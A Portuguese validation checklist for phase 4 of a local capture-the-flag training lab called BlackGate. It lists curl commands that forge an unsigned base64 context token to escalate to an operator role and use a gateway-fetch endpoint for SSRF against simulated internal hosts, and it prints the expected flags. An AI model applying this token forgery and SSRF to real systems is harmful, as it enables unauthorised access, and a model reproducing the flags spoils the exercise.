# Validação - Lab 05 BlackGate - Fase 4

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- serviço `blackgate` em execução;
- porta `8096:3000`.

## Health e recon público

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/robots.txt
curl -i http://localhost:8096/.well-known/security.txt
curl -i http://localhost:8096/api/status
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i http://localhost:8096/debug/ping
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- endpoints antigos continuam respondendo;
- `/health` retorna `1.3.0-phase4`;
- `/api/version` retorna build `bg-phase4-gateway-trust`;
- debug com header retorna diagnostics de contexto e gateway limitados;
- nenhum segredo real é exposto em rota pública.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest" \
  -d "password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fase 3 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Gateway metadata

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/gateway-metadata
```

Resultado esperado:

- `gateway_fetch`;
- allowlist de hosts internos;
- hint de Fase 4;
- sem flag da Fase 4 nesse endpoint.

## Gateway fetch health

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
```

Resultado esperado:

- HTTP 200;
- `service: api-core`;
- `network: internal`.

## Gateway fetch flag

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/metadata"
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Files-vault metadata

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/metadata"
```

Resultado esperado:

- `storage_mode: document-catalog`;
- `safe_paths`;
- `restricted_paths`;
- hint para Fase 5.

## Bloqueio externo

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://example.com"
```

Resultado esperado:

- HTTP 403;
- `blocked_upstream`.

## Sem token

```bash
curl -i -b /tmp/bg-cookie.txt \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
```

Resultado esperado:

- erro `bad_request` ou `forbidden`;
- nenhum acesso ao upstream simulado.

## Rotas autenticadas no navegador

Após login, validar:

```text
/dashboard
/context
/gateway
/tickets
/assets
/security-policy
/logout
```

## Docker

Conferir:

```bash
grep -n "8096:3000" docker-compose.yml
grep -n "ports:" docker-compose.yml
```

Resultado esperado:

- porta pública `8096:3000`;
- somente o serviço web exposto.
